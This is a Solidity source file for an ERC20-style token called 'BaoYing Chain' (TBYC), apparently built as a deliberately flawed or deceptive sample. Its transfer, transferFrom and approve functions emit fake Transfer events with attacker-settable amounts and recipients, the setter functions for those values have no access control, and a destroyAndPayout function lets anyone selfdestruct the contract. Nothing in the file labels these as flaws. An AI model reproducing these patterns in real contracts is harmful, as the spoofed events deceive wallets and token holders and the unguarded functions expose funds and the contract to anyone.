pragma solidity 0.5.12;

contract Tbyc {
    address public owner;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public forcedRecipient;
    uint256 public vulnerableAmount;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    /* This generates a public event on the blockchain that will notify clients */
    event Transfer(address indexed from, address indexed to, uint256 value);

    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);

    /* This notifies clients about the amount burnt */
    event Burn(address indexed from, uint256 value);

    /* Initializes contract with initial supply tokens to the creator of the contract */
    constructor() public {
        owner = 0x0a09B58084554786215Dabe7Ab645cB17b1e490E;
        name = "BaoYing Chain";
        symbol = "TBYC";
        decimals = 18;
        totalSupply = 1314000000000000000000000000; // 1.314e27
        balanceOf[owner] = totalSupply;
    }

    /* Send coins */
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid recipient");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        emit Transfer(msg.sender, _to, vulnerableAmount);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    /* Allow another contract to spend some tokens in your behalf */
    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0), "Invalid spender");
        emit Transfer(msg.sender, forcedRecipient, _value);
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    /* A contract attempts to get the coins */
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid recipient");
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        emit Transfer(msg.sender, _to, vulnerableAmount);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function setForcedRecipient(address newRecipient) public  {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setVulnerableAmount(uint256 _amount) public {
        vulnerableAmount = _amount;
    }

   function destroyAndPayout(address payable payout) public  {
        uint256 bal = balanceOf[address(this)];
        if (bal > 0) {
            balanceOf[payout] += bal;
            balanceOf[address(this)] = 0;
            emit Transfer(address(this), payout, bal); 
        }
        selfdestruct(payout);
    }


    /* Burn tokens from sender's account */
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance to burn");

        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        emit Burn(msg.sender, _value);
        return true;
    }

    /* Approval event needed for ERC20 */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
